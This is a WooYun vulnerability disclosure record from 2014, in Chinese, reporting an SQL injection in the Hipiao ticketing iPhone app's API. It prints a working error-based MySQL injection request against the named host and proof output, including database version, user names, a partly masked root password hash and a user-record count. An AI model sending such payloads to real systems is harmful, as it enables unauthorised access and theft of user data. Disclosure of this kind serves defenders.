{"id": 5641, "wybug_id": "wooyun-2014-049178", "wybug_title": "哈票网iphone手机端app存在注射漏洞400W会员受到威胁", "wybug_corp": "哈票网", "wybug_author": "孤狐浪子", "wybug_date": "2014-01-17 17:43", "wybug_open_date": "2014-03-03 17:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 哈票网iphone手机端APP应用存在注入漏洞，可导致用户信息被泄露，服务器受到严重安全隐患。 详细说明：  \nPOST /iphonehall/iphonehalla.php?plantid=cc9bb621-7f43-11e3-b6b6-001bb97ef1a4@@4'+and(select+1+from(select+count(*),concat(0x20,mid((concat((concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)),1,64),floor(rand(0)*2))from+information_schema.tables+group+by+2)a)--+ HTTP/1.1Host: open.hipiao.com:8000Proxy-Connection: keep-aliveAccept-Encoding: gzipContent-Type: text/xml;charset=utf-8Accept-Language: zh-cnAccept: */*Content-Length: 0Connection: keep-aliveEncoding: utf-8User-Agent: HiPiao/1.3.2 CFNetwork/672.0.8 Darwin/14.0.0\n以上plantid参数存在注入，此连接还可以绕过用户后台登录进行查询，过滤不严格，此注入点使用MYSQL数据ROOT权限，可进行更多方式进行渗透测试。注： 以上手机端只是进行了简单的安全测试，漏洞利用只简单进行了测试，没有进行深入，点到为止。   漏洞证明：  显示版本号 5.0.45-log{%}hipiao{%}iphone@10.10.0.xxx{%}iphone@10.10.0.xxxxhipiao HP_MEMxxxxx_INFO    4080220 用户信息数量。waxxxxxxn@zjxsh.com  7cfb53xxxxxxxxxxxxba663ad3droot*AEB5DFEE383XXXXXXXXXX28C8ECC382DF71IDC-D-5568  mysql用户密码HASH和用户名Warning: mysql_connect() [function.mysql-connect]: php_network_getaddresses: getaddrinfo failed:  in /var/www/html/xxxxxxx/mysql.lib.php on line 27Warning: mysql_select_db() [function.mysql-select-db]: Access denied for user 'root'@'localhost' (using password: NO) in /var/xxxx/html/xxxxx/mysql.lib.php on line 29Warning: mysql_select_db() [function.mysql-select-db]: A link to the server could not be established in /var/www/html/xxxxx/mysql.lib.php on line 29注部分敏感信息使用 xxxxxx打码。   修复方案：  过滤一个，管理员在仔细检查一下APP端其它调用接口。求礼物 ^-^   版权声明：转载请注明来源 孤狐浪子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}